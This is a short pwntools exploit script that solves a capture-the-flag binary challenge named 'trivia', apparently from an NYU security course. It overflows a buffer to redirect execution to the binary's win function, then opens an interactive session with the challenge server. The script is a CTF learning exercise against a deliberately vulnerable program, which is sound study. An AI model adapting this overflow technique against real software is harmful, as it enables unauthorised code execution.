from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
target_file = "./trivia"

LOCAL = True

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    b questions
    continue
    ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1281)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

e = ELF(target_file, checksec=False)
target_addr = e.symbols.win
print(f'Target address: {hex(target_addr)}')
p.recvuntil(b"> ")
a = asm("endbr64; push rbp", arch='amd64',os='linux')
p.sendline((b'B' * 0x10)  + p64(target_addr + len(a)))
p.recvuntil(b"> ")
p.send(p64(0xdeadbeefdeadbeef))
p.interactive()
